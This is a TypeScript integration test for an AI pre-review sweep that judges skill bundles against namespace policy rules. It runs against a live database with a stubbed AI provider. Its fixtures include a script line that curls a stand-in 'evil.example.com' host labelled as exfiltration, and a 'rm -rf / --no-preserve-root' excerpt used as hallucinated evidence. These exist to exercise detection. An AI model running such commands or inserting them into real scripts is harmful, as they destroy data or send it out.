// Live-DB integration test for §47 policy rules inside the §46 pre-review sweep (SKILLY_SPEC.md
// §47.5, §47.6, §47.8, §47.10). Gated behind SKILLY_DB_E2E=1; requires a migrated Postgres.
//
// Validates: a run judges the rules applicable to its subject in the same call; per-rule results
// land with the run (a real violation keeps its evidence with a recomputed line; a hallucinated
// quote is downgraded to `uncertain`); `proposal.policy_violation` fires once, only for the real
// violation, never for a cache link; identical bytes reuse a run only under identical rules (another
// namespace with no rules gets its own run); a rule edit makes the reconcile queue a `policy` run;
// a published version's first violation is an onset (maintainer notification + audit), an
// identical re-run is not.
import { test } from "node:test";
import assert from "node:assert/strict";
import AdmZip from "adm-zip";
import { savePrereviewSetting, currentPrereviewRun, requestPrereviewRerun, contentDigest, type BundleEntry } from "@skilly/shared";
import { encryptAiToken } from "@skilly/shared/ai";
import { enqueueProposalPrereviews, executePrereviewRun, reconcilePolicyRuns } from "../scan/aiPrereview.js";
import type { ArtifactStore } from "../storage/objectStore.js";

const enabled = process.env.SKILLY_DB_E2E === "1";
const KEY = Buffer.alloc(32, 11);

function zip(files: Record<string, string>): Buffer {
  const z = new AdmZip();
  for (const [p, c] of Object.entries(files)) z.addFile(p, Buffer.from(c));
  return z.toBuffer();
}
const entries = (files: Record<string, string>): BundleEntry[] => Object.entries(files).map(([path, c]) => ({ path, bytes: new TextEncoder().encode(c) }));
const skillMd = (name: string) => `---\nname: ${name}\ndescription: d\n---\n# ${name}\nRun scripts/run.sh.\n`;
const FILES_V = { "SKILL.md": skillMd("a"), "scripts/run.sh": "#!/bin/sh\necho start\ncurl https://api.example.com/data\n" };
const FILES_H = { "SKILL.md": skillMd("b"), "scripts/run.sh": "#!/bin/sh\necho hallucination\n" };
const FILES_PUB = { "SKILL.md": skillMd("d"), "scripts/run.sh": "curl https://evil.example.com/x\necho exfil\n" };

/** The stub provider: no §46 findings; the policy part depends on which bundle is in the prompt,
 *  told apart by their `echo` marker lines (not by URL substrings). */
function reply(prompt: string): Response {
  const policy = prompt.includes("echo start")
    ? [{ rule: "R1", outcome: "violates", explanation: "Calls an API directly.", evidence: [{ path: "scripts/run.sh", excerpt: "curl https://api.example.com/data" }] }]
    : prompt.includes("echo hallucination")
      ? [{ rule: "R1", outcome: "violates", explanation: "Deletes things.", evidence: [{ path: "scripts/run.sh", excerpt: "rm -rf / --no-preserve-root" }] }]
      : prompt.includes("echo exfil")
        ? [{ rule: "R1", outcome: "violates", explanation: "Exfiltrates.", evidence: [{ path: "scripts/run.sh", excerpt: "curl https://evil.example.com/x" }] }]
        : [{ rule: "R1", outcome: "complies", explanation: "Fine.", evidence: [] }];
  const body = { summary: "s", findings: [], ...(prompt.includes("POLICY RULES") ? { policy } : {}) };
  return new Response(JSON.stringify({ content: [{ type: "text", text: JSON.stringify(body) }], model: "stub-policy", usage: { input_tokens: 5, output_tokens: 5 } }), {
    status: 200,
    headers: { "content-type": "application/json" },
  });
}

test("policy rules in the §46 sweep: judge, verify, notify, cache by rules, reconcile, onset", { skip: !enabled }, async () => {
  const { Pool } = await import("pg");
  const pool = new Pool({ connectionString: process.env.DATABASE_URL });
  const started = new Date();
  const tag = `psweep${Date.now().toString(36)}`;
  const key = (k: string) => `${tag}/${k}`;
  const mem = new Map<string, Buffer>([[key("v"), zip(FILES_V)], [key("v2"), zip(FILES_V)], [key("v3"), zip(FILES_V)], [key("h"), zip(FILES_H)], [key("pub"), zip(FILES_PUB)]]);
  const store: ArtifactStore = {
    async get(k) { const b = mem.get(k); if (!b) throw new Error("missing " + k); return b; },
    async put(k, b) { mem.set(k, b); },
  };
  const savedAi = (await pool.query(`select * from ai_integration where id = 1`)).rows[0] ?? null;
  const savedSetting = (await pool.query(`select value from platform_settings where key = 'ai_prereview_enabled'`)).rows[0]?.value ?? null;
  const userIds: string[] = [];
  const nsIds: string[] = [];
  try {
    const mkNs = async (slug: string) => {
      const id = (await pool.query<{ id: string }>(`insert into namespaces (slug, display_name, require_review) values ($1, $1, true) returning id`, [slug])).rows[0]!.id;
      nsIds.push(id);
      return id;
    };
    const nsId = await mkNs(`${tag}-ns`);
    const bareNs = await mkNs(`${tag}-bare`); // no rules
    const mkUser = async (who: string) => {
      const id = (await pool.query<{ id: string }>(`insert into users (entra_object_id, email, display_name) values ($1, $2, $1) returning id`, [`${tag}-${who}`, `${tag}-${who}@org`])).rows[0]!.id;
      userIds.push(id);
      return id;
    };
    const submitter = await mkUser("submitter");
    const maintainer = await mkUser("maintainer");
    const ruleId = (await pool.query<{ id: string }>(
      `insert into policy_rules (scope, namespace_id, state, created_by) values ('namespace', $1, 'enforced', $2) returning id`, [nsId, maintainer],
    )).rows[0]!.id;
    await pool.query(
      `insert into policy_rule_revisions (rule_id, revision_no, title, body, context, author) values ($1, 1, 'No external APIs', 'No direct API calls.', 'Approved: acme-http.', $2)`,
      [ruleId, maintainer],
    );
    const mkProposal = async (ns: string, slug: string, artifact: string, files: Record<string, string>) => {
      const id = (await pool.query<{ id: string }>(
        `insert into proposals (target_namespace_id, proposed_semver, state, submitted_by) values ($1, '1.0.0', 'proposed', $2) returning id`, [ns, submitter],
      )).rows[0]!.id;
      const payload = { metadata: { skillSlug: slug, title: slug }, artifactObjectKey: key(artifact), contentSha256: contentDigest(entries(files)) };
      await pool.query(`insert into proposal_revisions (proposal_id, revision_no, payload, author) values ($1, 1, $2::jsonb, $3)`, [id, JSON.stringify(payload), submitter]);
      return id;
    };
    const pV = await mkProposal(nsId, `${tag}-v`, "v", FILES_V);
    const pV2 = await mkProposal(nsId, `${tag}-v2`, "v2", FILES_V); // same bytes, same rules
    const pBare = await mkProposal(bareNs, `${tag}-bare`, "v3", FILES_V); // same bytes, no rules
    const pH = await mkProposal(nsId, `${tag}-h`, "h", FILES_H);

    await pool.query(`delete from ai_integration`);
    await pool.query(
      `insert into ai_integration (id, enabled, provider, base_url, model, token_enc, token_last4, last_test_at, last_test_ok)
       values (1, true, 'anthropic', 'https://api.anthropic.com', 'stub-policy', $1, 'tok1', now(), true)`,
      [encryptAiToken("stubtok1", KEY)],
    );
    await savePrereviewSetting(pool, true, null);
    let calls = 0;
    const fetchImpl = (async (_u: string | URL | Request, init?: RequestInit) => {
      calls++;
      const body = JSON.parse(String(init?.body ?? "{}")) as { system?: string; messages: { content: string }[] };
      return reply(`${body.system ?? ""}\n${body.messages[0]?.content ?? ""}`);
    }) as typeof fetch;
    const deps = { env: { key: KEY, source: "worker" as const, fetchImpl, sleep: async () => {} } };

    await enqueueProposalPrereviews(pool, { enabled: true, since: new Date(Date.now() - 60_000).toISOString() }, 5000);
    const run = async (proposalId: string) => (await currentPrereviewRun(pool, { kind: "proposal", proposalId, revision: 1 }))!;
    const rV = await run(pV);
    assert.equal((await run(pV2)).id, rV.id, "identical bytes under the same rules reuse the run");
    assert.notEqual((await run(pBare)).id, rV.id, "a namespace with different (no) rules never reuses it");
    assert.ok(rV.rulesFingerprint, "the run carries the rules fingerprint");
    assert.equal((await run(pBare)).rulesFingerprint, null);

    for (const id of [pV, pH, pBare]) assert.equal(await executePrereviewRun(pool, store, await run(id), deps), "done");

    const results = async (runId: string) =>
      (await pool.query<{ outcome: string; evidence: { path: string; line: number; excerpt: string }[]; evidence_rejected: boolean; explanation: string; rule_state: string }>(
        `select outcome, evidence, evidence_rejected, explanation, rule_state from ai_prereview_policy_results where run_id = $1`, [runId],
      )).rows;
    const [v] = await results(rV.id);
    assert.equal(v!.outcome, "violates");
    assert.equal(v!.rule_state, "enforced");
    assert.deepEqual(v!.evidence, [{ path: "scripts/run.sh", line: 3, excerpt: "curl https://api.example.com/data" }]);
    const [h] = await results((await run(pH)).id);
    assert.deepEqual([h!.outcome, h!.evidence_rejected], ["uncertain", true]);
    assert.match(h!.explanation, /^Downgraded: the cited evidence was not found/);
    assert.deepEqual(await results((await run(pBare)).id), [], "no rule applies there");

    const violationNotes = (await pool.query<{ payload: { proposalId: string } }>(
      `select payload from notifications where user_id = $1 and type = 'proposal.policy_violation'`, [submitter],
    )).rows.map((r) => r.payload.proposalId);
    assert.deepEqual(violationNotes, [pV], "only the real violation notifies, and never through the cache link (pV2)");

    // A rule edit: the reconcile queues a fresh `policy` run for the open proposals in scope.
    await pool.query(
      `insert into policy_rule_revisions (rule_id, revision_no, title, body, context, author) values ($1, 2, 'No external APIs', 'Stricter wording.', null, $2)`,
      [ruleId, maintainer],
    );
    await reconcilePolicyRuns(pool);
    const after = await run(pV);
    assert.notEqual(after.id, rV.id);
    assert.equal(after.trigger, "policy");
    assert.equal(after.status, "pending");

    // A published version: the first violation is an onset; an identical re-run is not.
    const skillId = (await pool.query<{ id: string }>(
      `insert into skills (namespace_id, slug, title, description, tool_harness, type, visibility, status)
       values ($1, $2, $2, 'd', 'claude-code', 'hosted', 'org', 'active') returning id`, [nsId, `${tag}-pub`],
    )).rows[0]!.id;
    const versionId = (await pool.query<{ id: string }>(
      `insert into skill_versions (skill_id, semver, is_prerelease, status, artifact_object_key, artifact_sha256, content_sha256, created_by, git_published)
       values ($1, '1.0.0', false, 'active', $2, 'sha', $3, $4, true) returning id`, [skillId, key("pub"), contentDigest(entries(FILES_PUB)), maintainer],
    )).rows[0]!.id;
    await pool.query(`insert into skill_maintainers (skill_id, user_id) values ($1, $2)`, [skillId, maintainer]);
    await reconcilePolicyRuns(pool); // the displayed version has no run yet → a `policy` run
    const vRun = (await currentPrereviewRun(pool, { kind: "version", versionId }))!;
    assert.equal(vRun.trigger, "policy");
    assert.equal(await executePrereviewRun(pool, store, vRun, deps), "done");
    const flagNotes = async () => (await pool.query(`select 1 from notifications where user_id = $1 and type = 'skill.policy_flag'`, [maintainer])).rowCount;
    assert.equal(await flagNotes(), 1);
    assert.equal((await pool.query(`select 1 from audit_log where action = 'skill.policy_flagged' and target_id = $1`, [`${skillId}@1.0.0`])).rowCount, 1);
    const rr = await requestPrereviewRerun(pool, { kind: "version", versionId }, maintainer, null);
    assert.ok(rr.ok);
    assert.equal(await executePrereviewRun(pool, store, (await currentPrereviewRun(pool, { kind: "version", versionId }))!, deps), "done");
    assert.equal(await flagNotes(), 1, "an identical re-run notifies nobody");
    assert.ok(calls >= 5);
  } finally {
    await pool.query(`delete from notifications where user_id = any($1::uuid[])`, [userIds]);
    await pool.query(`delete from ai_prereviews where created_at >= $1`, [started]);
    await pool.query(`delete from ai_usage where feature = 'proposal_prereview' and created_at >= $1`, [started]);
    for (const ns of nsIds) await pool.query(`delete from proposals where target_namespace_id = $1`, [ns]);
    const c = await pool.connect();
    try {
      await c.query("begin");
      await c.query("set local skilly.allow_version_delete = 'on'");
      await c.query(`delete from skills where namespace_id = any($1::uuid[])`, [nsIds]);
      await c.query("commit");
    } finally {
      c.release();
    }
    await pool.query(`delete from policy_rules where namespace_id = any($1::uuid[])`, [nsIds]);
    await pool.query(`delete from ai_integration`);
    if (savedAi) {
      const cols = Object.keys(savedAi);
      await pool.query(`insert into ai_integration (${cols.join(", ")}) values (${cols.map((_, i) => `$${i + 1}`).join(", ")})`, cols.map((k) => savedAi[k]));
    }
    if (savedSetting === null) await pool.query(`delete from platform_settings where key = 'ai_prereview_enabled'`);
    else await pool.query(`update platform_settings set value = $1::jsonb where key = 'ai_prereview_enabled'`, [JSON.stringify(savedSetting)]);
    await pool.end();
  }
});
